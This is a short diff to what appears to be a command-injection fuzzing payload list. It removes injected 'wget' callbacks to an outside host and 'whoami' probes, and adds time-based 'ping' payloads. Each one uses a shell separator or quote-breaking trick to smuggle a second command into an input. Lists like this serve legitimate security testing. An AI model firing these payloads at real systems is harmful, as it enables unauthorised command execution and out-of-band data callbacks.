@@ -1,10 +1,4 @@
- %0a wget https://www.aswsec.com/index.php?cmdInjPer0A
- || wget https://www.aswsec.com/index.php?cmdInjPipePipe
- & wget https://www.aswsec.com/index.php?cmdInjApp &
- ' & wget https://www.aswsec.com/index.php?cmdInjApp & echo '
- " & wget https://www.aswsec.com/index.php?cmdInjApp & echo "
-  %0a whoami
- || whoami
- & whoami &
- ' & whoami & echo '
- " & whoami & echo "
+ & ping -c 15 127.0.0.1 &
+ %0a ping -c 15 127.0.0.1
+ ' & ping -c 15 127.0.0.1 & echo '
+ " & ping -c 15 127.0.0.1 & echo "
